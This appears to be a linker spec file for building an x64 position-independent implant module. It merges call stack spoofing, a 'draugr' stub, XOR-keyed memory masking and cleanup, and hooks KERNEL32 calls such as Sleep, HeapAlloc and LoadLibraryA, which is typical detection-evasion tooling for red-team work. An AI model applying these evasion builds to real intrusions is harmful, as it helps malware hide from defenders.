x64:
    load "../bin/pico.x64.o"
        make object +disco
    
    # merge the hook functions
    load "../bin/hooks.x64.o"
        merge

    # merge the call stack spoofing
    load "../bin/spoof.x64.o"
        merge

    # merge the asm stub
    load "../bin/draugr.x64.bin"
        linkfunc "draugr_stub"

    # merge mask
    load "../bin/mask.x64.o"
        merge

    generate $KEY 128
    patch "xorkey" $KEY
    
    # merge cfg code
    load "../bin/cfg.x64.o"
        merge
            
    # merge cleanup
    load "../bin/cleanup.x64.o"
        merge

    # export setup_hooks and setup_memory
    exportfunc "setup_hooks"  "__tag_setup_hooks"
    exportfunc "setup_memory" "__tag_setup_memory"

    attach  "KERNEL32$VirtualProtect" "_VirtualProtect"
    attach  "KERNEL32$VirtualQuery"   "_VirtualQuery"

    addhook "KERNEL32$ExitThread"  "_ExitThread"
    addhook "KERNEL32$HeapAlloc"   "_HeapAlloc"
    addhook "KERNEL32$HeapReAlloc" "_HeapReAlloc"
    addhook "KERNEL32$HeapFree"    "_HeapFree"
    addhook "KERNEL32$Sleep"       "_Sleep"
    addhook "KERNEL32$LoadLibraryA" "_LoadLibraryA"
        
    mergelib "../Crystal-palace/libtcg.x64.zip"
    
    run "yara.spec"
    
    export